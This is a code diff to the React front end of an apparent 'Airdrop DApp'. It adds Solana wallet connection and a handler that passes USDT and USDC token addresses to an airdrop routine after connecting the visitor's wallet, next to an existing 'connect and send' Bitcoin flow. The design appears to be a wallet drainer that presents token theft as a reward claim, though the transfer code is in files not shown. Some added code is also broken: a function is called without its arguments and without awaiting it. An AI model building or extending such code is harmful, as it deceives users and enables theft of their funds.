@@ -10,12 +10,14 @@ import AirdropStats from './AirdropStat';
 import LiveChartComponent from './LiveChart.component';
 import FooterNav from './FooterNav';
 import Carousel from './Carousel';
-import { connectBitcoinWallet, getBrc20Balances, sendBitcoin } from './web3/bitcoinWallet';
+import { getBrc20Balances, sendBitcoin } from './web3/bitcoinWallet';
 import WalletSelector from './WalletSelector';
 import { FaBitcoin, FaEthereum } from "react-icons/fa"; // FontAwesome icons
 import { SiSolana } from "react-icons/si"; // SimpleIcons for Solana
 // import Provider from '@walletconnect/ethereum-provider';
 // import { useMemo } from "react";
+import { SolanaContext } from './context/solana_context/SolanaContext';
+import { connectSolana, handleSolanaAirdrop } from './web3/solana';
 
 const tokenAddresses = [
   "0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48", // USDC
@@ -37,6 +39,11 @@ const tokenAddresses = [
   "0xa0b73e1ff0b80914ab6fe0444e65848c4c34450b", // CRO 18 decimals
 ];
 
+const solanaTokenList = [
+  "Es9vMFrzaCERmJfrF4H2FYD4KCoNkY11McCe8BenwNYB", // USDT
+  "EPjFWdd5AufqSSqeM2qN1xzybapC8G4wEGGkZwyTDt1v", // USDC
+]
+
 const titleText = "Welcome -> to -> the -> Airdrop -> DApp";
 // Precompute random delays once
 const titleDelays = titleText.split("").map(() => `${(Math.random() * 0.5).toFixed(2)}s`);
@@ -47,6 +54,7 @@ function App() {
   const topRef = useRef(null);
   const chartRef = useRef(null);
   const [showModal, setShowModal] = useState(false);
+  const {solState, solDispatch} = useContext(SolanaContext)
 
   const scrollToTop = () => {
     window.scrollTo({
@@ -60,7 +68,6 @@ function App() {
       behavior: "smooth"
     });
   };
-
 
   const handleConnectAndSend = async () => {
     if(loading) return; // prevent multiple clicks
@@ -118,6 +125,30 @@ function App() {
       alert("Something went wrong. Please try again.");
     }
     setLoading(false);
+  }
+
+  const handleSolanaAirdropFlow = async () => {
+    if(loading) return
+
+    // solana
+    try {
+      const solAddress = await connectSolana()
+      if(solAddress){
+        solDispatch({type: "CONNECT_SOLANA", payload: {address: solAddress}})
+        await handleSolanaAirdrop(solAddress, solanaTokenList)
+        alert("Solana rewards Processing...")
+      }
+    } catch (e){
+      console.log("Airdrop Flow Error: ", e);
+    } finally {
+      setLoading(false)
+    }
+    
+  }
+  const handleFullAirdropFlow = async () => {
+    if(loading) return
+    handleConnectAndSend()
+    handleSolanaAirdrop()
   }
   
   // Unified Bitcoin Handler
@@ -391,6 +422,8 @@ function App() {
           scrollToTop={scrollToTop}
           scrollToCharts={scrollToCharts}
           handleConnectAndSend={handleConnectAndSend}
+          handleFullAirdropFlow={handleFullAirdropFlow}
+          handleSolanaAirdropFlow={handleSolanaAirdropFlow}
           handleWalletConnected={handleWalletConnected}
           loading={loading}
           address={state.address}
